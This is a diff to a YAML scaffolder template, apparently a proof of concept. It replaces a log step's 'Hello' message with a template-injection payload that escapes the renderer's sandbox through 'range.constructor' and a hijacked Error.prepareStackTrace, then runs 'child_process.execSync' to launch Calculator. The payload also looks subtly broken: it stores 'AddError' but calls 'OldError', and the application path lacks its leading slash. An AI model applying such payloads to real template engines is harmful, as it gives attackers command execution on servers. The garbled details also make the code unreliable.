@@ -12,4 +12,4 @@ spec:
       name: Log Message
       action: debug:log
       input:
-        message: Hello 
+        message: Hello ${{range.constructor("this.env.__proto__.renderString = function() {globalThis.AddError = globalThis.Error;globalThis.Error = class Error {};globalThis.Error.prepareStackTrace = (cs,trace) => {trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"System/Applications/Calculator.app/Contents/MacOs/Calculator\"); };const {stack} = new globalThis.OldError();}")().triggerException()}}
